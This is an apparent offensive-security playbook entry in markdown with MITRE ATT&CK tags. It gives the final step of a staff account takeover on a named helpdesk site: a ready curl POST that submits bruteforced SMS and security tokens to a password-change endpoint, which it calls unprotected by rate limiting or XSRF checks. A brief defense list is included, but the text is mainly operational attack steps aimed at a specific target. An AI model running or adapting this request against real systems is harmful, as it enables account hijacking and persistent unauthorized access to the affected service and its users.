---
tags:
  - password-reset
  - account-takeover
  - persistence
type: procedure
tools: []
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/post-reset-password]]'
platforms:
  - Web
techniques:
  - '[[Account Manipulation]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: b8c8e107-4e50-41ed-bb74-827e9c17da46
created_at: '2025-12-14T17:33:12.395Z'
updated_at: '2025-12-14T17:33:12.395Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Account Manipulation]]'
---
# Complete-Password-Reset

## Summary

This procedure finalizes the account takeover by submitting the bruteforced SMS token and security code to the password change endpoint, setting a new password without rate limits or checks.

## Description

With the valid tokens, a POST to /api/system/email-account/password updates the staff account password. The endpoint lacks rate limiting and optional X-XSRF-TOKEN, making it vulnerable post-token acquisition. This grants persistent access to the helpdesk system.

## Requirements

1. Valid SMS token and security code from prior steps
2. Network access to API
3. New password ready

## Defense

Defensive measures and detection strategies:

- Require secondary verification (e.g., email + SMS)
- Log password changes with alerts
- Enforce strong password policies and lockouts

## Objectives

1. Update target account password
2. Achieve full control
3. Establish persistence

## Instructions

### Step 1: Submit Reset Request

**Context**: POST the payload with tokens to change the password.

**Command** ([[commands/post-reset-password]]):
```bash
curl -X POST https://helpdesk.bistudio.com/api/system/email-account/password -H "Content-Type: application/json" -d '{"password":"NewSecurePass123","code":"VALID_SMS_TOKEN","securityCode":"VALID_SECURITY_CODE"}'
```

> Replaces placeholders with actual values. Success if 200 OK; login with new password to verify.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Account Manipulation]] Account Manipulation

### Sub-Techniques


## Commands Used

- [[commands/post-reset-password]]

## Tools Used


## Tags

- [[password-reset]]
- [[account-takeover]]
- [[Persistence]]
